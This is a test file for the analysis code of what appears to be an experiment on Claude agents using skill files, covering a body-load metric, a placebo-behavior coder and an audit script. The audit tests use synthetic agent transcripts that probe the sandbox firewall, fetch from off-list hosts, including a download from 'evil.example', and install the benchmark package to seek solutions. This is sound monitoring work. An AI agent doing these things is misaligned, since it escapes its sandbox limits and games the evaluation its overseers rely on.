import { describe, expect, test } from "bun:test";
import { mkdtempSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { computeManip } from "../analysis/manip.ts";
import { codeTrial } from "../analysis/placebo-behavior.ts";

// Analysis-only subset of the prereg 2 tests, landed to main with the analysis code
// (manip.ts, placebo-behavior.ts, audit.py) and the skill map. The runner-coupled blocks
// (grid.ts jobConfig and invokesArm, proxy.ts startProxy and worstCaseMicros, the agent
// prompt builder and the body-load probe) stay on the runner branch; the runner itself is
// reachable through the laneb-quick-2-runner tag, not on main (Option C).

const here = import.meta.dir;

describe("prereg 2 skill map", () => {
  test("skill-map.json covers all 20 final tasks and names real gstack skills", () => {
    const final: string[] = JSON.parse(readFileSync(join(here, "../tasks/final.json"), "utf8")).tasks;
    const map = JSON.parse(readFileSync(join(here, "../runner/skill-map.json"), "utf8")) as Record<string, { skill: string; branch: string }>;
    const gstackSkills: string[] = JSON.parse(readFileSync(join(here, "../arms/manifests/gstack.json"), "utf8")).skills.names;
    const branches = ["fix-existing", "optimize-existing", "implement-new"];
    expect(new Set(Object.keys(map))).toEqual(new Set(final));
    expect(final.length).toBe(20);
    for (const task of final) {
      expect(map[task]).toBeDefined();
      expect(gstackSkills).toContain(map[task].skill);
      expect(branches).toContain(map[task].branch);
    }
  });
});

describe("prereg 2 manip (body-load) analysis", () => {
  test("manip reads body-load rate and median first-request tokens per cell", () => {
    const sessions = [
      { id: "s1", model: "claude-haiku-5-5", meta: { arm: "gstack" }, cmd_expanded: true, first_req_prompt_tokens: 7000 },
      { id: "s2", model: "claude-haiku-5-5", meta: { arm: "gstack" }, cmd_expanded: true, first_req_prompt_tokens: 7100 },
      { id: "s3", model: "claude-haiku-5-5", meta: { arm: "gstack" }, cmd_expanded: false, first_req_prompt_tokens: 520 },
      { id: "s4", model: "claude-haiku-5-5", meta: { arm: "placebo" }, cmd_expanded: true, first_req_prompt_tokens: 6800 },
      { id: "s5", model: "claude-haiku-5-5", meta: { arm: "none" }, cmd_expanded: null },
    ];
    // none-arm first-request tokens are backfilled from the requests log.
    const requests = [{ event: "request", session: "s5", request: 1, input_tokens_bound: 420 }];
    const rep = computeManip({ sessions, requests });
    const gstack = rep.cells.find((c) => c.arm === "gstack")!;
    expect(gstack.bodyLoadRate).toBeCloseTo(2 / 3);
    expect(gstack.medianFirstReqPromptTokens).toBe(7000);
    expect(gstack.passes).toBe(false);
    const placebo = rep.cells.find((c) => c.arm === "placebo")!;
    expect(placebo.bodyLoadRate).toBe(1);
    expect(placebo.passes).toBe(true);
    const none = rep.cells.find((c) => c.arm === "none")!;
    expect(none.bodyLoadRate).toBeNull();
    expect(none.passes).toBeNull();
    expect(none.medianFirstReqPromptTokens).toBe(420);
    expect(rep.gatePass).toBe(false);
  });

  test("the pilot gate pools invoked trials per model and runs the grid unless every model is under", () => {
    const sess = (model: string, arm: string, loads: number, total: number) =>
      Array.from({ length: total }, (_, i) => ({ id: `${model}-${arm}-${i}`, model, meta: { arm }, cmd_expanded: i < loads }));
    // Both pass: Haiku pools gstack 8/10 + placebo 10/10 = 18/20 = 90%; Opus 20/20. Grid runs, no label.
    const bothPass = computeManip({ sessions: [
      ...sess("claude-haiku-5-5", "gstack", 8, 10), ...sess("claude-haiku-5-5", "placebo", 10, 10),
      ...sess("claude-opus-5-5", "gstack", 10, 10), ...sess("claude-opus-5-5", "placebo", 10, 10),
    ] });
    expect(bothPass.models.find((m) => m.model === "claude-haiku-5-5")!.bodyLoadRate).toBeCloseTo(0.9);
    expect(bothPass.models.every((m) => m.passes)).toBe(true);
    expect(bothPass.gridRuns).toBe(true);
    expect(bothPass.underModels).toEqual([]);
    // One model under: Haiku pools 4/10 + 10/10 = 14/20 = 70%; Opus passes. Grid runs, Haiku labeled.
    const oneUnder = computeManip({ sessions: [
      ...sess("claude-haiku-5-5", "gstack", 4, 10), ...sess("claude-haiku-5-5", "placebo", 10, 10),
      ...sess("claude-opus-5-5", "gstack", 10, 10), ...sess("claude-opus-5-5", "placebo", 10, 10),
    ] });
    expect(oneUnder.gridRuns).toBe(true);
    expect(oneUnder.underModels).toEqual(["claude-haiku-5-5"]);
    // Both under: grid does not run.
    const bothUnder = computeManip({ sessions: [
      ...sess("claude-haiku-5-5", "gstack", 1, 10), ...sess("claude-haiku-5-5", "placebo", 1, 10),
      ...sess("claude-opus-5-5", "gstack", 1, 10), ...sess("claude-opus-5-5", "placebo", 1, 10),
    ] });
    expect(bothUnder.gridRuns).toBe(false);
    // No invoked session anywhere: an error, never a vacuous pass over an empty table.
    const empty = computeManip({ sessions: [{ id: "x", model: "claude-opus-5-5", meta: { arm: "none" }, cmd_expanded: null }] });
    expect(empty.gridRuns).toBe(false);
    expect(empty.error).not.toBeNull();
  });
});

describe("prereg 2 placebo-behavior coding", () => {
  test("the placebo-behavior coder assigns each of the five categories", () => {
    const am = (content: unknown[]) => JSON.stringify({ type: "AssistantMessage", content });
    const text = (t: string) => ({ text: t });
    const tool = (name: string, input: Record<string, unknown>) => ({ name, input, id: name + Math.random() });

    const ends = [am([text("I am done, nothing to run.")])];
    expect(codeTrial(ends).category).toBe("ends");

    const opensAnother = [
      am([text("Let me look at the skill."), tool("Bash", { command: "ls" })]),
      am([tool("Read", { file_path: "/root/.claude/skills/investigate/SKILL.md" })]),
    ];
    expect(codeTrial(opensAnother).category).toBe("opens_another");

    const dismisses = [am([text("This skill is not helpful here."), tool("Bash", { command: "ls" })])];
    expect(codeTrial(dismisses).category).toBe("dismisses");

    const cites = [am([text("Following the skill, I will run the tests."), tool("Bash", { command: "ls" })])];
    expect(codeTrial(cites).category).toBe("cites");

    const continues = [am([text("Let me check the files first."), tool("Bash", { command: "ls" })])];
    expect(codeTrial(continues).category).toBe("continues");
  });

  test("a trial with no assistant message is coded outside the five categories", () => {
    expect(codeTrial([]).category).toBe("no_message");
    expect(codeTrial([JSON.stringify({ type: "UserMessage", content: [{ text: "tool result" }] })]).category).toBe("no_message");
  });
});

describe("audit.py", () => {
  const bash = (id: string, command: string, result: string) => [
    JSON.stringify({ type: "AssistantMessage", content: [{ id, name: "Bash", input: { command } }] }),
    JSON.stringify({ type: "UserMessage", content: [{ tool_use_id: id, content: result, is_error: false }] }),
  ];
  function trial(root: string, name: string, lines: string[], reward: number | null) {
    const d = join(root, "jobs/j", name);
    mkdirSync(join(d, "agent"), { recursive: true });
    writeFileSync(join(d, "config.json"), JSON.stringify({ agent: { model_name: "anthropic/claude-haiku-5-5", kwargs: { arm: "gstack" } } }));
    writeFileSync(join(d, "result.json"), JSON.stringify({ verifier_result: reward === null ? null : { rewards: { reward } } }));
    writeFileSync(join(d, "agent/laneb-summary.json"), "{}");
    writeFileSync(join(d, "agent/sdk-messages.jsonl"), lines.join("\n") + "\n");
  }

  test("flags sandbox probes, off-list fetches, direct PyPI reads and benchmark packages", () => {
    const root = mkdtempSync(join(tmpdir(), "laneb-audit-"));
    mkdirSync(join(root, "out"));
    writeFileSync(join(root, "out/proxy-sessions.jsonl"), ["t1", "t2", "t3"].map((t, i) => JSON.stringify({ id: "s" + i, trial: t + "__env", close_reason: "agent_finished", ledger_settle: { ok: true } })).join("\n") + "\n");
    writeFileSync(join(root, "out/proxy-requests.jsonl"), [
      { event: "request", status: 200, usage: { output_tokens: 1 }, max_tokens: 32000 },
      { event: "request", status: 200, usage: { input_tokens: 0, output_tokens: 0, cache_creation_input_tokens: 0, cache_read_input_tokens: 0 }, max_tokens: 32000, cost_micros: 0, worst_micros: 900 },
      { event: "request", status: 200, usage: { input_tokens: 0, output_tokens: 0 }, max_tokens: 32000, cost_micros: 900, worst_micros: 900 },
    ].map((r) => JSON.stringify(r)).join("\n") + "\n");
    trial(root, "t1", [
      ...bash("a", "python3 -c \"import urllib.request; urllib.request.urlopen('https://grep.app/api/search?q=x')\"", "URLError(SSLEOFError(8))"),
      ...bash("b", "pip install --index-url https://pypi.org/simple numpy", "Successfully installed numpy"),
    ], 1);
    trial(root, "t2", [
      ...bash("c", "iptables -L", "Chain INPUT"),
      ...bash("d", "curl -s https://pypi.org/pypi/terminal-bench/json", "{}"),
      ...bash("e", "pip install terminal-bench", "Successfully installed"),
    ], 0);
    trial(root, "t3", [
      ...bash("f", "ls /app", "a.out"),
      ...bash("g", "python3 -c \"import urllib.request as u; [print(x, u.urlopen(x).status) for x in ['https://grep.app/a', 'https://example.org/b']]\"", "https://grep.app/a ERR URLError\nhttps://example.org/b 200"),
    ], null);
    // A silent off-list fetch (curl -s -o, no stdout) beside unrelated failure text must stay unclear:
    // the absence of a success marker cannot be read as the fetch having failed.
    trial(root, "t5", [
      ...bash("h", "curl -s https://evil.example/x.py -o /tmp/x.py && cat /tmp/nope", "cat: /tmp/nope: No such file or directory"),
    ], 0);
    const t4 = join(root, "jobs/j/t4");
    mkdirSync(join(t4, "agent"), { recursive: true });
    writeFileSync(join(t4, "config.json"), JSON.stringify({ agent: { model_name: "anthropic/claude-haiku-5-5", kwargs: { arm: "none" } } }));
    const run = Bun.spawnSync(["python3", join(here, "../analysis/audit.py"), root, "--json", join(root, "audit.json")]);
    expect(run.exitCode).toBe(0);
    const out = JSON.parse(readFileSync(join(root, "audit.json"), "utf8"));
    // t1's urllib fetch printed a URLError, but a Python fetch is kept unclear for a manual read
    // because a silent Python success alongside the error would be invisible (the post-run audit fix).
    expect(out.trials.t1.flags).toEqual(["offlist_attempt", "offlist_unclear", "solution_seeking"]);
    expect(out.trials.t1.installs).toEqual(["numpy"]);
    expect(out.trials.t2.flags).toEqual(["bench_package", "network_bypass", "pypi_direct", "solution_seeking"]);
    expect(out.trials.t3.flags).toEqual(["offlist_attempt", "offlist_unclear", "solution_seeking"]);
    expect(out.trials.t5.flags).toEqual(["offlist_attempt", "offlist_unclear"]);
    expect(out.no_reward).toEqual([["t3", null], ["t4", "no result.json"]]);
    expect(out.ok_without_usage).toBe(1);
    expect(out.ok_without_usage_charged_worst).toBe(1);
    expect(out.rerun_duplicate_sessions).toEqual([]);
    expect(out.bad_max_tokens).toBe(0);
  });
});
